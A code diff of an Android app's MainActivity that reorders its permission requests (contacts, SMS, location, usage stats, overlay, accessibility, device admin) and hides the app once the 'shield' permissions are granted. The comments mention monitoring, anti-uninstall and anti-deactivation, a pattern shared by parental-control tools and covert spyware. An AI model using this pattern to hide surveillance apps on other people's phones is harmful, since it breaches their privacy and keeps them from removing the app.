@@ -124,14 +124,14 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun runPermissionSetup() {
-        // 1. Runtime permissions handled first via standard OS dialog.
+        // 1. Runtime permissions (Contacts, SMS, Location, etc.)
         val missing = PermissionHelper.missingRuntimePermissions(this)
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
-            return // Wait for result and resume in onResume/onRestart
+            return
         }
 
-        // 2. Tiramisu specific permissions
+        // 2. Android 13+ Specifics
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             val permissions = arrayOf(
                 android.Manifest.permission.POST_NOTIFICATIONS,
@@ -146,31 +146,31 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // 3. System Alert Window (Overlay)
-        if (!PermissionHelper.hasOverlayPermission(this)) {
-            startActivity(PermissionHelper.overlaySettingsIntent(this))
-            return
-        }
-
-        // 4. Usage Data access
-        if (!PermissionHelper.hasUsageStatsPermission(this)) {
-            startActivity(PermissionHelper.usageAccessSettingsIntent())
-            return
-        }
-
-        // 5. Accessibility Service (CRITICAL)
+        // 3. Accessibility Service (CRITICAL for Monitoring & Anti-Uninstall)
         if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
             startActivity(PermissionHelper.accessibilitySettingsIntent())
             return
         }
 
-        // 6. Device Admin
+        // 4. Usage Data access (Required for App Detection)
+        if (!PermissionHelper.hasUsageStatsPermission(this)) {
+            startActivity(PermissionHelper.usageAccessSettingsIntent())
+            return
+        }
+
+        // 5. System Alert Window (Overlay for Blocking)
+        if (!PermissionHelper.hasOverlayPermission(this)) {
+            startActivity(PermissionHelper.overlaySettingsIntent(this))
+            return
+        }
+
+        // 6. Device Admin (Anti-Deactivation & Remote Lock)
         if (!PermissionHelper.isDeviceAdminEnabled(this)) {
             startActivity(PermissionHelper.deviceAdminSettingsIntent(this))
             return
         }
         
-        // If we reach here, most are granted. Enable shield and hide.
+        // Everything granted -> Enable protection and vanish
         maybeEnableShieldAfterPermissions()
     }
 
@@ -305,12 +305,13 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun maybeEnableShieldAfterPermissions() {
-        // We hide as soon as these 3 "shield" permissions are ready.
-        val coreGranted = PermissionHelper.hasOverlayPermission(this) &&
+        // Only vanish when the shield-critical set is FULLY ready.
+        val coreReady = PermissionHelper.hasOverlayPermission(this) &&
             PermissionHelper.isAccessibilityServiceEnabled(this) &&
-            PermissionHelper.isDeviceAdminEnabled(this)
+            PermissionHelper.isDeviceAdminEnabled(this) &&
+            PermissionHelper.hasUsageStatsPermission(this)
 
-        if (!coreGranted) {
+        if (!coreReady) {
             return
         }
 
